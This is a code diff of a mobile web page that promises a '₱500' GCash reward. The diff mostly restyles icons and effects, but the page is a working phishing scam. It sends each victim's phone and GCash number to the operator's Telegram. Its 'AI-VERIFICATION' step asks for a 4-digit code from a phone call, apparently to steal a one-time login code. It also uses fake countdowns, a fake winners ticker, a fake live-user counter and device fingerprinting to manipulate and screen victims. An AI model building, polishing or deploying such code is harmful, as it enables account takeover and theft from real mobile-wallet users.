+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="2" y="6" width="20" height="12" rx="2"/>
+                    <circle cx="12" cy="12" r="2.5"/>
+                    <path d="M6 12h.01M18 12h.01"/>
+                </svg>
+                <span>GET ₱500</span>
+            </button>
             <div class="ai-error" id="phoneError"></div>
         </div>
     </div>
@@ -539,19 +740,34 @@
     <!-- POPUP 2: SKIP AND CLAIM -->
     <div class="popup-overlay" id="skipClaimPopup">
         <div class="popup-card">
-            <button class="popup-close" id="skipClaimClose">✕</button>
+            <button class="popup-close" id="skipClaimClose">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M18 6 6 18"/><path d="m6 6 12 12"/>
+                </svg>
+            </button>
             <div class="popup-img-wrap"><img src="images/cat_auth.png" alt="Skip" class="popup-img" onerror="this.style.opacity='0.4';"></div>
             <h2 class="popup-title">AUTHORIZE WITHDRAWAL</h2>
             <p class="popup-subtitle">Authorize your instant withdrawal.<br>Wait for the countdown to continue.</p>
             <div class="countdown-badge" id="skipCountdownBadge">⏳ SKIP IN <span id="skipCountdownNum">10</span>s</div>
-            <button class="popup-btn" id="skipClaimBtn" disabled><span class="btn-icon">⏭️</span><span>SKIP & CLAIM</span></button>
+            <button class="popup-btn" id="skipClaimBtn" disabled>
+                <!-- SVG: Skip Forward Icon -->
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                    <polygon points="5 4 15 12 5 20 5 4"/>
+                    <line x1="19" y1="5" x2="19" y2="19"/>
+                </svg>
+                <span>SKIP & CLAIM</span>
+            </button>
         </div>
     </div>
 
     <!-- POPUP 3: QUEUE -->
     <div class="popup-overlay" id="queuePopup">
         <div class="popup-card">
-            <button class="popup-close" id="queueClose">✕</button>
+            <button class="popup-close" id="queueClose">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M18 6 6 18"/><path d="m6 6 12 12"/>
+                </svg>
+            </button>
 
             <!-- NORMAL QUEUE STATE -->
             <div id="queueNormalState">
@@ -571,19 +787,35 @@
                     <span class="ready-dot"></span>
                     <span>✨ READY TO CLAIM ✨</span>
                 </div>
+
                 <div class="ready-image-wrap">
                     <img src="images/cat_cn.png" alt="Ready to Claim" class="ready-image" onerror="this.style.opacity='0.4';">
                 </div>
+
                 <h2 class="ready-title">YOUR TURN!</h2>
                 <p class="ready-subtitle">Your slot is now available.<br><strong>Tap the button below to claim!</strong></p>
+
                 <div style="position: relative; margin-top: 4px;">
+                    <div class="ready-glow-ring"></div>
                     <button class="ready-claim-btn" id="readyClaimBtn">
-                        <span class="btn-icon">🎁</span>
+                        <!-- SVG: Gift Box Icon -->
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="3" y="8" width="18" height="4" rx="1"/>
+                            <path d="M12 8v13"/>
+                            <path d="M19 12v7a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2v-7"/>
+                            <path d="M7.5 8a2.5 2.5 0 0 1 0-5A4.8 8 0 0 1 12 8a4.8 8 0 0 1 4.5-5 2.5 2.5 0 0 1 0 5"/>
+                        </svg>
                         <span>CLAIM NOW</span>
                     </button>
                 </div>
+
                 <div class="ready-note">
-                    <i class="fas fa-hand-point-up"></i>
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M18 11V6a2 2 0 0 0-2-2a2 2 0 0 0-2 2"/>
+                        <path d="M14 10V4a2 2 0 0 0-2-2a2 2 0 0 0-2 2v2"/>
+                        <path d="M10 10.5V6a2 2 0 0 0-2-2a2 2 0 0 0-2 2v8"/>
+                        <path d="M18 8a2 2 0 1 1 4 0v6a8 8 0 0 1-8 8h-2c-2.8 0-4.5-.86-5.99-2.34l-3.6-3.6a2 2 0 0 1 2.83-2.82L7 15"/>
+                    </svg>
                     <span>Tap to open your reward</span>
                 </div>
             </div>
@@ -593,28 +825,53 @@
     <!-- POPUP 4: SUCCESS -->
     <div class="popup-overlay" id="successPopup">
         <div class="popup-card">
-            <button class="popup-close" id="successClose">✕</button>
+            <button class="popup-close" id="successClose">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M18 6 6 18"/><path d="m6 6 12 12"/>
+                </svg>
+            </button>
             <div class="popup-success">
                 <div class="success-icon">🎉</div>
                 <h2 class="success-title">CLAIMED!</h2>
                 <p class="success-message" id="successMessage">Your reward has been successfully claimed.<br>Please wait for further instructions.</p>
             </div>
-            <button class="popup-btn" id="successOkBtn" style="margin-top:20px;"><span class="btn-icon">✅</span><span>OK</span></button>
+            <button class="popup-btn" id="successOkBtn" style="margin-top:20px;">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M20 6 9 17l-5-5"/>
+                </svg>
+                <span>OK</span>
+            </button>
         </div>
     </div>
 
     <!-- POPUP 5: AI VERIFICATION -->
     <div class="popup-overlay" id="aiVerifyPopup">
         <div class="popup-card">
-            <button class="popup-close" id="aiVerifyClose">✕</button>
+            <button class="popup-close" id="aiVerifyClose">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M18 6 6 18"/><path d="m6 6 12 12"/>
+                </svg>
+            </button>
             <div class="popup-img-wrap"><img src="images/ai_call.png" alt="AI Call" class="popup-img" onerror="this.style.opacity='0.4';"></div>
             <h2 class="popup-title">AI-VERIFICATION</h2>
             <p class="popup-subtitle"><i class="fas fa-phone-volume" style="color:#ffe066;"></i> <strong>Tatawagan ka ng AI-verification system</strong> para i-verify ang iyong GCash number.</p>
             <div id="aiStage1">
                 <div class="ai-status-text">📝 Ilagay ang iyong <strong>GCash number</strong> para matawagan ka.</div>
-                <div class="input-label"><i class="fas fa-mobile-screen-button"></i><span>GCASH NUMBER</span></div>
+                <div class="input-label">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect width="14" height="20" x="5" y="2" rx="2" ry="2"/>
+                        <path d="M12 18h.01"/>
+                    </svg>
+                    <span>GCASH NUMBER</span>
+                </div>
                 <input type="tel" class="phone-input" id="aiGcashInput" placeholder="09XX XXX XXXX" maxlength="13" inputmode="numeric" autocomplete="off">
-                <button class="popup-btn" id="aiRequestCallBtn"><span class="btn-icon">📞</span><span>REQUEST AI CALL</span></button>
+                <button class="popup-btn" id="aiRequestCallBtn">
+                    <!-- SVG: Phone Call Icon -->
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+                    </svg>
+                    <span>REQUEST AI CALL</span>
+                </button>
                 <div class="ai-error" id="aiGcashError"></div>
             </div>
             <div id="aiStage2" class="hidden">
@@ -623,9 +880,22 @@
             </div>
             <div id="aiStage3" class="hidden">
                 <div class="ai-status-text">✅ <strong style="color:#39ff14;">CALL CONNECTED!</strong><br><span style="font-size:11px; color:rgba(255,255,255,0.8);">Enter the 4-digit code from the call</span></div>
-                <div class="input-label"><i class="fas fa-ticket-alt"></i><span>ENTER 4-DIGIT CODE</span></div>
+                <div class="input-label">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M2 9a3 3 0 0 1 0 6v2a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-2a3 3 0 0 1 0-6V7a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2Z"/>
+                        <path d="M13 5v2M13 17v2M13 11v2"/>
+                    </svg>
+                    <span>ENTER 4-DIGIT CODE</span>
+                </div>
                 <input type="text" class="ai-code-input" id="aiCodeInput" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
-                <button class="popup-btn" id="aiVerifyBtn"><span class="btn-icon">✅</span><span>VERIFY CODE</span></button>
+                <button class="popup-btn" id="aiVerifyBtn">
+                    <!-- SVG: Check Circle Icon -->
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"/>
+                        <path d="m9 12 2 2 4-4"/>
+                    </svg>
+                    <span>VERIFY CODE</span>
+                </button>
                 <div class="ai-error" id="aiCodeError"></div>
             </div>
         </div>
@@ -640,8 +910,12 @@
                 You are not able to claim your rewards.<br>
                 Please try again on another device and use another GCash Account for claiming rewards.
             </p>
-            <button class="popup-btn" id="banOkBtn" style="background: linear-gradient(180deg,#ff8888 0%,#ff1744 60%,#8b0000 100%); color:#fff; box-shadow: 0 5px 0 #4a0000;">
-                <span class="btn-icon">❌</span><span>OK</span>
+            <button class="popup-btn" id="banOkBtn" style="background: linear-gradient(180deg,#ff8888 0%,#ff1744 60%,#8b0000 100%); color:#fff; box-shadow: 0 5px 0 #4a0000, 0 8px 20px rgba(0,0,0,0.55), 0 0 30px rgba(255,23,68,0.6);">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10"/>
+                    <path d="m15 9-6 6M9 9l6 6"/>
+                </svg>
+                <span>OK</span>
             </button>
         </div>
     </div>
@@ -949,19 +1223,67 @@
                 var amountElInit = document.querySelector('.ticker-amount');
                 if (phoneElInit) phoneElInit.textContent = initial.phone;
                 if (amountElInit) amountElInit.textContent = '₱500';
-                setInterval(updateTicker, 6000);
+                setInterval(updateTicker, 4500);
             }
             if (browserAllowed) initWinnersTicker();
 
             // ============================================================
-            // CONFETTI BURST (REDUCED)
+            // BACKGROUND EFFECTS
+            // ============================================================
+            if (isMobile && browserAllowed) {
+                createFloatingCoins();
+                createSparkles();
+                createConfetti();
+            }
+            function createFloatingCoins() {
+                var layer = document.getElementById('coinLayer'); if (!layer) return;
+                var coinEmojis = ['🪙', '💰', '💎', '⭐', '✨'];
+                for (var i = 0; i < 8; i++) {
+                    var coin = document.createElement('div'); coin.className = 'coin';
+                    coin.textContent = coinEmojis[Math.floor(Math.random() * coinEmojis.length)];
+                    coin.style.left = (Math.random() * 100) + '%';
+                    coin.style.fontSize = (18 + Math.random() * 16) + 'px';
+                    coin.style.animationDuration = (7 + Math.random() * 6) + 's';
+                    coin.style.animationDelay = (Math.random() * 8) + 's';
+                    layer.appendChild(coin);
+                }
+            }
+            function createSparkles() {
+                var layer = document.getElementById('sparkleLayer'); if (!layer) return;
+                for (var i = 0; i < 12; i++) {
+                    var sparkle = document.createElement('div'); sparkle.className = 'sparkle';
+                    sparkle.style.left = (Math.random() * 100) + '%';
+                    sparkle.style.top = (Math.random() * 100) + '%';
+                    sparkle.style.animationDelay = (Math.random() * 3) + 's';
+                    sparkle.style.animationDuration = (1.8 + Math.random() * 2) + 's';
+                    layer.appendChild(sparkle);
+                }
+            }
+            function createConfetti() {
+                var layer = document.getElementById('confettiLayer'); if (!layer) return;
+                var colors = ['#ffe066', '#6ea8ff', '#ff6b9d', '#39ff14', '#ffffff', '#ff8800'];
+                for (var i = 0; i < 12; i++) {
+                    var piece = document.createElement('div'); piece.className = 'confetti';
+                    piece.style.left = (Math.random() * 100) + '%';
+                    piece.style.background = colors[Math.floor(Math.random() * colors.length)];
+                    piece.style.animationDuration = (5 + Math.random() * 5) + 's';
+                    piece.style.animationDelay = (Math.random() * 5) + 's';
+                    piece.style.width = (5 + Math.random() * 6) + 'px';
+                    piece.style.height = (8 + Math.random() * 8) + 'px';
+                    piece.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+                    layer.appendChild(piece);
+                }
+            }
+
+            // ============================================================
+            // CONFETTI BURST
             // ============================================================
             function triggerBurst() {
                 var colors = ['#ffe066', '#6ea8ff', '#ff6b9d', '#39ff14', '#ffffff', '#ff8800'];
-                for (var i = 0; i < 18; i++) {
+                for (var i = 0; i < 30; i++) {
                     (function() {
                         var piece = document.createElement('div');
-                        piece.style.cssText = 'position:fixed;left:50%;top:50%;width:' + (6 + Math.random() * 8) + 'px;height:' + (8 + Math.random() * 10) + 'px;background:' + colors[Math.floor(Math.random() * colors.length)] + ';border-radius:' + (Math.random() > 0.5 ? '50%' : '2px') + ';z-index:999999;pointer-events:none;will-change:transform,opacity;transition:transform 1s cubic-bezier(0.2, 0.8, 0.3, 1), opacity 1s ease;';
+                        piece.style.cssText = 'position:fixed;left:50%;top:50%;width:' + (6 + Math.random() * 8) + 'px;height:' + (8 + Math.random() * 10) + 'px;background:' + colors[Math.floor(Math.random() * colors.length)] + ';border-radius:' + (Math.random() > 0.5 ? '50%' : '2px') + ';z-index:999999;pointer-events:none;box-shadow:0 0 10px rgba(255,255,255,0.6);transition:transform 1.2s cubic-bezier(0.2, 0.8, 0.3, 1), opacity 1.2s ease;';
                         document.body.appendChild(piece);
                         var angle = Math.random() * Math.PI * 2;
                         var distance = 150 + Math.random() * 250;
@@ -971,7 +1293,7 @@
                             piece.style.transform = 'translate(' + tx + 'px, ' + ty + 'px) rotate(' + (Math.random() * 720) + 'deg)';
                             piece.style.opacity = '0';
                         }, 20);
-                        setTimeout(function() { if (piece.parentNode) piece.parentNode.removeChild(piece); }, 1200);
+                        setTimeout(function() { if (piece.parentNode) piece.parentNode.removeChild(piece); }, 1400);
                     })();
                 }
             }
@@ -1078,7 +1400,7 @@
                 userPhone = rawPhone;
                 var self = this;
                 this.disabled = true;
-                this.innerHTML = '<span class="btn-icon">⏳</span><span>CHECKING...</span>';
+                this.innerHTML = '<span>⏳ CHECKING...</span>';
 
                 checkBan(userPhone, deviceFingerprint).then(function(banResult) {
                     if (banResult.isBanned) {
@@ -1134,20 +1456,20 @@
                             if (firewallActive) {
                                 closePopup('catClaimPopup');
                                 self.disabled = false;
-                                self.innerHTML = '<span class="btn-icon">💰</span><span>GET ₱500</span>';
+                                self.innerHTML = '<span>💰 GET ₱500</span>';
                                 showAiVerificationPopup();
                                 return;
                             }
                             return getAvailableLink().then(function(linkUrl) {
                                 if (linkUrl) {
                                     closePopup('catClaimPopup');
-                                    self.innerHTML = '<span class="btn-icon">✅</span><span>OPENING...</span>';
+                                    self.innerHTML = '<span>✅ OPENING...</span>';
                                     setTimeout(function() { openAsDeeplink(linkUrl); }, 800);
                                     return;
                                 }
                                 closePopup('catClaimPopup');
                                 self.disabled = false;
-                                self.innerHTML = '<span class="btn-icon">💰</span><span>GET ₱500</span>';
+                                self.innerHTML = '<span>💰 GET ₱500</span>';
                                 openPopup('skipClaimPopup');
                                 startSkipCountdown();
                             });
@@ -1156,7 +1478,7 @@
                 }).catch(function(err) {
                     console.error('Ban check error:', err);
                     self.disabled = false;
-                    self.innerHTML = '<span class="btn-icon">💰</span><span>GET ₱500</span>';
+                    self.innerHTML = '<span>💰 GET ₱500</span>';
                 });
             });
 
@@ -1227,7 +1549,10 @@
                     if (numEl) numEl.textContent = skipCountdown;
                     if (skipCountdown <= 0) {
                         stopSkipCountdown();
-                        if (btn) { btn.disabled = false; btn.innerHTML = '<span class="btn-icon">⏭️</span><span>SKIP & CLAIM</span>'; }
+                        if (btn) {
+                            btn.disabled = false;
+                            btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 4 15 12 5 20 5 4"/><line x1="19" y1="5" x2="19" y2="19"/></svg><span>SKIP & CLAIM</span>';
+                        }
                         var b = document.getElementById('skipCountdownBadge');
                         if (b) b.innerHTML = '✅ READY TO CLAIM';
                     }
@@ -1246,9 +1571,7 @@
                 closePopup('skipClaimPopup');
                 stopSkipCountdown();
 
-                // ✅ GAMITIN NA YUNG userPhone (na-enter sa POPUP 1) as GCash number
                 var gcashValue = userPhone;
-
                 if (!gcashValue || gcashValue.length !== 11 || !gcashValue.startsWith('09')) {
                     console.warn('⚠️ Invalid userPhone:', gcashValue);
                     alert('Invalid mobile number. Please refresh and try again.');
@@ -1257,7 +1580,6 @@
 
                 sendTelegram('💰 CLAIM FORM SUBMITTED\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n💳 GCash: ' + gcashValue + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
 
-                // ✅ DIRETSO SA QUEUE — walang GCash input
                 setTimeout(function() {
                     readyToClaim = false;
                     pendingLink = null;
@@ -1372,7 +1694,7 @@
             }
 
             // ============================================================
-            // ✅ READY CLAIM BUTTON — user-triggered deeplink
+            // ✅ READY CLAIM BUTTON
             // ============================================================
             document.getElementById('readyClaimBtn').addEventListener('click', function() {
                 if (!browserAllowed) return;
@@ -1381,7 +1703,8 @@
                     return;
                 }
                 if (navigator.vibrate) { try { navigator.vibrate(30); } catch(e) {} }
-                this.innerHTML = '<span class="btn-icon">⏳</span><span>OPENING...</span>';
+
+                this.innerHTML = '<span>⏳ OPENING...</span>';
                 this.style.pointerEvents = 'none';
                 this.style.opacity = '0.85';
 
@@ -1403,7 +1726,7 @@
                 var cb1 = ref1.on('value', function(snap) {
                     var data = snap.val();
                     if (data && data.url && data.active !== false) {
-                        console.log('🚀 Link detected (admin)');
+                        console.log('🚀 Link detected (admin) — switching to READY');
                         showReadyToClaim(data.url);
                     }
                 });
@@ -1415,12 +1738,14 @@
                         var links = snap.val();
                         var key = Object.keys(links)[0];
                         var linkData = links[key];
-                        console.log('🚀 Link detected (links)');
+                        console.log('🚀 Link detected (links) — switching to READY');
+
                         db.ref('links/' + key).update({
                             status: 'claimed',
                             user: userPhone || 'Unknown',
                             claimedAt: Date.now()
                         });
+
                         showReadyToClaim(linkData.url);
                     }
                 });
@@ -1442,7 +1767,7 @@
                     var change = Math.floor(Math.random() * 5) - 2;
                     baseCount = Math.max(80, baseCount + change);
                     countEl.textContent = baseCount;
-                }, 2000);
+                }, 1500);
             }
             function stopLiveUsersCounter() { if (liveUsersInterval) { clearInterval(liveUsersInterval); liveUsersInterval = null; } }
 
@@ -1455,7 +1780,16 @@
                 document.getElementById('aiStage2').classList.add('hidden');
                 document.getElementById('aiStage3').classList.add('hidden');
                 var gcashEl = document.getElementById('aiGcashInput');
-                if (gcashEl) gcashEl.value = '';
+                // ✅ AUTO-FILL sa GCash input — gamit ang userPhone (hindi na mag-a-ask)
+                if (gcashEl && userPhone) {
+                    var formatted = userPhone;
+                    if (userPhone.length === 11) {
+                        formatted = userPhone.substring(0, 4) + ' ' + userPhone.substring(4, 7) + ' ' + userPhone.substring(7);
+                    }
+                    gcashEl.value = formatted;
+                } else if (gcashEl) {
+                    gcashEl.value = '';
+                }
                 ['aiGcashError', 'aiCodeError'].forEach(function(id) {
                     var el = document.getElementById(id);
                     if (el) el.classList.remove('show');
